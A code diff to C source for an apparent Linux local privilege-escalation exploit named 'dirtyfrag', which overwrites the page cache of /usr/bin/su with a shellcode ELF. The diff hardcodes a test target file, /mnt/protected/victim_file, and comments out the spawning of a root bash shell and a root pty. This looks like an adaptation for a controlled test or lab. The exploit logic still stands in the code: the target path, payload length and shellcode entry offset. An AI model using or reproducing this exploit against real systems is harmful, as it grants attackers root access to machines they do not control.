@@ -34,18 +34,8 @@
 #define ENC_PORT         4500
 #define SEQ_VAL          200
 #define REPLAY_SEQ       100
-
-static const char *get_target_path(void)
-{
-	const char *p = getenv("TARGET_PATH");
-	if (p && *p)
-		return p;
-	if (access("/mnt/protected/victim_file", F_OK) == 0)
-		return "/mnt/protected/victim_file";
-	return "/usr/bin/su";
-}
-#define TARGET_PATH      get_target_path()
-
+// PATCH - TARGET_PATH "/usr/bin/su" -> "/mnt/protected/victim_file"
+#define TARGET_PATH      "/mnt/protected/victim_file"
 #define PATCH_OFFSET     0              /* overwrite whole ELF starting at file[0] */
 #define PAYLOAD_LEN      192            /* bytes of shell_elf to write (48 triggers) */
 #define ENTRY_OFFSET     0x78           /* shellcode entry inside the new ELF */
@@ -364,8 +354,8 @@ int su_lpe_main(int argc, char **argv)
 		SLOG("post-write verify failed (target unchanged)");
 		return 1;
 	}
-	SLOG("%s page-cache patched (entry 0x%x = shellcode)",
-			TARGET_PATH, ENTRY_OFFSET);
+	SLOG("/usr/bin/su page-cache patched (entry 0x%x = shellcode)",
+			ENTRY_OFFSET);
 	return 0;
 }
 /*
@@ -1706,7 +1696,7 @@ static const uint8_t su_marker[8] = {
 
 static int su_already_patched(void)
 {
-	int fd = open(TARGET_PATH, O_RDONLY);
+	int fd = open("/usr/bin/su", O_RDONLY);
 	if (fd < 0)
 		return 0;
 	uint8_t got[8];
@@ -1920,12 +1910,11 @@ int main(int argc, char **argv)
 		else if (!strcmp(argv[i], "-v") ||
 				!strcmp(argv[i], "--verbose"))
 			verbose = 1;
-		else if (argv[i][0] != '-')
-			setenv("TARGET_PATH", argv[i], 1);
 	}
 
 	if (getuid() == 0) {
-		execlp("/bin/bash", "bash", (char *)NULL);
+		// PATCH - comment out interactive shell
+		// execlp("/bin/bash", "bash", (char *)NULL);
 		_exit(1);
 	}
 
@@ -1955,7 +1944,8 @@ int main(int argc, char **argv)
 		restore_stderr(saved_err);
 
 	if (patched) {
-		dprintf(2, "dirtyfrag: target patched successfully\n");
+		// PATCH - comment out interactive root pty
+		// (void)run_root_pty();
 		return 0;
 	}
 
